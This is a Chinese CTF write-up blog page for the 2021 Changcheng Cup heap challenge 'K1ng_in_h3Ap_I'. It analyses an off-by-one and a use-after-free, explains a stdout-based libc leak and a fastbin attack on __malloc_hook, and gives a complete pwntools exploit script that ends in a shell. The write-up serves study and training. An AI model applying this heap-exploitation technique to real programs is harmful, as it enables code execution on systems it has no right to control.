@@ -1,0 +1,570 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/0.ico">
+  <link rel="icon" href="/img/0.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="sh0ve1">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x0 前言2021年长城杯的一道pwn题，偏简单。 0x1 题目信息 使用libc-2.223.so(2.23-0ubuntu11.3) file pwn  ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreterfor GNU&#x2F;Linux 2.6.32, BuildID[sha">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021长城杯-K1ng_in_h3Ap_I">
+<meta property="og:url" content="https://sh0ve1.github.io/2021/11/05/changancup2021-K1ng-in-h3Ap-I/index.html">
+<meta property="og:site_name" content="sh0ve1&#39;s blog">
+<meta property="og:description" content="0x0 前言2021年长城杯的一道pwn题，偏简单。 0x1 题目信息 使用libc-2.223.so(2.23-0ubuntu11.3) file pwn  ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreterfor GNU&#x2F;Linux 2.6.32, BuildID[sha">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-11-05T02:49:18.000Z">
+<meta property="article:modified_time" content="2021-11-17T09:52:55.002Z">
+<meta property="article:author" content="sh0ve1">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="UAF">
+<meta property="article:tag" content="fastbin attack">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  <title>2021长城杯-K1ng_in_h3Ap_I - sh0ve1&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"sh0ve1.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"pU0JQUaRtEv6Lgu0jxYpEBT9-gzGzoHsz","app_key":"2Gdcl19Uu0nQBNMs6fu6YiR4","server_url":"https://pu0jquar.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh0ve1&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/1.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="2021长城杯-K1ng_in_h3Ap_I">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-11-05 10:49" pubdate>
+        2021年11月5日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.1k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      35 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2021长城杯-K1ng_in_h3Ap_I</h1>
+            
+            <div class="markdown-body">
+              <h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>2021年长城杯的一道pwn题，偏简单。</p>
+<h2 id="0x1-题目信息"><a href="#0x1-题目信息" class="headerlink" title="0x1 题目信息"></a>0x1 题目信息</h2><ul>
+<li>使用libc-2.223.so(2.23-0ubuntu11.3)</li>
+<li><code>file pwn</code></li>
+</ul>
+<figure class="highlight plaintext"><figcaption><span>ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter</span><a href="/lib64/ld-linux-x86-64.so.2,">for GNU/Linux 2.6.32, BuildID[sha1]</a></figcaption><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs pwn:">```<br>- `checksec pwn`<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs"> Arch:     amd64-64-little
+RELRO:    Full RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      PIE enabled
+</code></pre></div>
+ <figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><br><span class="hljs-meta">## 0x2 功能分析</span><br><br>- <span class="hljs-keyword">add</span>: 由于可覆盖idx，所以可以申请任意个堆块，堆块大小限制为<span class="hljs-number">0</span>~<span class="hljs-number">0xF0</span>，申请成功之后就把地址和堆块大小分别存储在两个数组中； <br></code></pre></td></tr></table></figure>
+<p>_DWORD *add()<br>{<br>  _DWORD *result; &#x2F;&#x2F; rax<br>  int idx; &#x2F;&#x2F; [rsp+8h] [rbp-8h]<br>  int size; &#x2F;&#x2F; [rsp+Ch] [rbp-4h]</p>
+<p>  puts(“input index:”);<br>  idx &#x3D; get_Int();<br>  if ( idx &lt; 0 || idx &gt; 10 )<br>    exit(0);<br>  puts(“input size:”);<br>  size &#x3D; get_Int();<br>  if ( size &lt; 0 || size &gt; 0xF0 )<br>    exit(0);<br>  heap_array[idx] &#x3D; malloc(size);<br>  result &#x3D; size_array;<br>  size_array[idx] &#x3D; size;<br>  return result;<br>}</p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta">- <span class="hljs-keyword">edit</span>：根据<span class="hljs-keyword">index</span>找到堆块地址和堆块大小，然后写入内容，输入函数存在`off-<span class="hljs-keyword">by</span>-one`漏洞<br><br></code></pre></td></tr></table></figure>
+<p>__int64 edit()<br>{<br>  int idx; &#x2F;&#x2F; [rsp+Ch] [rbp-4h]</p>
+<p>  puts(“input index:”);<br>  idx &#x3D; get_Int();<br>  if ( idx &lt; 0 || idx &gt; 15 || !heap_array[idx] )<br>    exit(0);<br>  puts(“input context:”);<br>  return Read(heap_array[idx], (unsigned int)size_array[idx]);&#x2F;&#x2F; off-by-one<br>}</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">- <span class="hljs-keyword">delete</span>：根据<span class="hljs-keyword">index</span>找到堆块地址，然后释放，没有将指针置为<span class="hljs-number">0</span>，存在<span class="hljs-string">`UAF`</span>漏洞<br></code></pre></td></tr></table></figure>
+<p>void delete()<br>{<br>  int idx; &#x2F;&#x2F; [rsp+Ch] [rbp-4h]</p>
+<p>  puts(“input index:”);<br>  idx &#x3D; get_Int();<br>  if ( idx &lt; 0 || idx &gt; 10 || !*((_QWORD <em>)&amp;heap_array + idx) || !size_array[idx] )<br>    exit(0);<br>  free(</em>((void **)&amp;heap_array + idx));          &#x2F;&#x2F; UAF<br>}</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>magic：打印出printf函数地址的后三字节<br></code></pre></td></tr></table></figure>
+<p>int magic()<br>{<br>  return printf(“%p\n”, (const void *)((unsigned __int64)&amp;printf &amp; 0xFFFFFF));<br>}</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>## <span class="hljs-number">0</span>x3 利用思路<br><br>- 由于没有输出函数，所以无法通过`UAF`来泄露`main_arena + offset`，从而获取libcbase，考虑利用`stdout`来泄露libc；<br>- 根据`printf`函数（在libc中）地址的后三位，我们可以根据固定偏移量推算出libc中`stdout`的地址；<br>- 当堆块释放到`unsorted bin`中时，fd和bk都是`main_arena + offset`，此时我们利用`UAF`漏洞修改fd的低<span class="hljs-number">2</span>字节（调试发现`main_arena`的地址和`stdout`的地址只有最好两字节有差异）为`stdout-<span class="hljs-number">0</span>x43`的地址即可（需要满足size检测）；<br>- 再次申请堆块获取`stdout`的控制权限,修改flags=<span class="hljs-number">0</span>xfbad1800，`_IO_read_ptr`，`_IO_read_base`和`_IO_read_end`为<span class="hljs-number">0</span>，即可泄露出关于libc的地址；<br>- 然后使用`UAF`和`fastbin attack`来修改`__malloc_hook`和`__realloc_hook`为`realloc`和`one_gadget`。<br><br>## <span class="hljs-number">0</span>x4 Exp<br><br></code></pre></td></tr></table></figure>
+<p>#!&#x2F;usr&#x2F;bin&#x2F;env python3</p>
+<h1 id="encoding-utf-8"><a href="#encoding-utf-8" class="headerlink" title="-- encoding: utf-8 --"></a>-<em>- encoding: utf-8 -</em>-</h1><p>‘’’<br>@文件        :exp.py<br>@说明        :fastbin attack &#x3D;&#x3D;&gt; stdout泄露libcbase; UAF &#x3D;&#x3D;&gt; fastbin attack to malloc_hook realloc_hook<br>             好像无需知道printf部分地址也行，因为main_arena应该与stdout的偏移也应该是固定的<br>@时间        :2021&#x2F;09&#x2F;27 16:59:14<br>@作者        :sh0ve1<br>@防护<br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br>‘’’</p>
+<p>from pwn import *<br>import pwnlib</p>
+<h1 id="context-log-level-x3D-‘debug’"><a href="#context-log-level-x3D-‘debug’" class="headerlink" title="context.log_level &#x3D; ‘debug’"></a>context.log_level &#x3D; ‘debug’</h1><p>context.arch &#x3D; ‘amd64’<br>context.os &#x3D; ‘linux’</p>
+<p>p &#x3D; process(‘.&#x2F;pwn’)<br>libc &#x3D; ELF(‘&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6’)</p>
+<p>def add(idx, sz):<br>    p.sendlineafter(‘&gt;&gt; ‘, str(1))<br>    p.sendlineafter(‘input index:’, str(idx))<br>    p.sendlineafter(‘input size:’, str(sz))</p>
+<p>def delete(idx):<br>    p.sendlineafter(‘&gt;&gt; ‘, str(2))<br>    p.sendlineafter(‘input index:’, str(idx))</p>
+<p>def edit(idx, ct):<br>    p.sendlineafter(‘&gt;&gt; ‘, str(3))<br>    p.sendlineafter(‘input index:’, str(idx))<br>    p.sendafter(‘input context:’, ct)</p>
+<p>def magic():<br>    p.sendlineafter(‘&gt;&gt; ‘, str(666))</p>
+<p>magic()<br>p.recvuntil(‘0x’)<br>printf_last_3_Bytes &#x3D; int(p.recv(6),16)<br>stdout_last_3_Bytes &#x3D; printf_last_3_Bytes + 0x36fe10</p>
+<p>log.info(“printf_last_3_Bytes: “ + hex(printf_last_3_Bytes))<br>log.info(“stdout_last_3_Bytes: “ + hex(stdout_last_3_Bytes))</p>
+<p>add(0,0x18)<br>add(1,0x20)<br>add(2,0x60)<br>add(3,0x10)<br>edit(0,b’A’*0x18 + b’\xa1’)<br>delete(1)<br>delete(2)<br>add(1,0x20)<br>edit(2,p16((stdout_last_3_Bytes&amp;0xffff)-0x43) + b’\n’) #必须设置为stdout前0x43字节，才能满足size要求</p>
+<p>add(2,0x60)<br>add(4,0x60) # idx&#x3D;4 指向stdout-0x33  </p>
+<p>#本题中，修改flags为0xfbad1800之后，后面的就没输入进去了？<br>payload &#x3D; b’\x00’*0x33 + p64(0xfbad1800) + p64(0)*3 + b’\x00’ + b’\n’<br>edit(4,payload)</p>
+<p>libc.address &#x3D; u64(p.recvuntil(b’\x7f’)[-6:].ljust(8, b’\x00’))-0x3c5600<br>realloc &#x3D; libc.sym[‘__libc_realloc’] # __libc_realloc<br>__malloc_hook &#x3D; libc.sym[‘__malloc_hook’]<br>one &#x3D; [0x45226,0x4527a,0xf03a4,0xf1247]<br>onegadget &#x3D; libc.address + one[1]</p>
+<p>log.info(“libc.address: “ + hex(libc.address))<br>log.info(“realloc: “ + hex(realloc))<br>log.info(“__malloc_hook: “ + hex(__malloc_hook))<br>log.info(“onegadget: “ + hex(onegadget))</p>
+<p>delete(2)<br>edit(2,p64(__malloc_hook - 0x23) + b’\n’) # UAF<br>add(5,0x60)<br>add(6,0x60) # idx&#x3D;6 指向 __malloc_hook - 0x23</p>
+<p>payload &#x3D; b’A’*(0x13 - 8) + p64(onegadget) + p64(realloc+12) + b’\n’<br>edit(6,payload)</p>
+<h1 id="pwnlib-gdb-attach-p-”b-libc-malloc”"><a href="#pwnlib-gdb-attach-p-”b-libc-malloc”" class="headerlink" title="pwnlib.gdb.attach(p,”b __libc_malloc”)"></a>pwnlib.gdb.attach(p,”b __libc_malloc”)</h1><p>add(7,0x10) #触发</p>
+<p>p.interactive()<br>p.close()</p>
+<p>&#96;&#96;&#96;</p>
+<h2 id="0x5-Rference"><a href="#0x5-Rference" class="headerlink" title="0x5 Rference"></a>0x5 Rference</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/27152c14e2e7">https://www.jianshu.com/p/27152c14e2e7</a></li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF-WriteUp/">CTF-WriteUp</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/heap/">heap</a>
+                    
+                      <a class="hover-with-bg" href="/tags/UAF/">UAF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/fastbin-attack/">fastbin attack</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/11/06/%E9%95%BF%E5%9F%8E%E6%9D%AF2021-K1ng-in-h3Ap-II/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2021长城杯-K1ng_in_h3Ap_II</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/11/04/starCTF2021-babyheap/">
+                        <span class="hidden-mobile">starCTF2021-babyheap</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"2GYV17CUmss2VIOWS1MFpfqj-gzGzoHsz","appKey":"0R4wcvymx9kXQiyeaw8t2otu","path":"window.location.pathname","placeholder":"说点什么吧","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/RunData.js"></script> </div> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
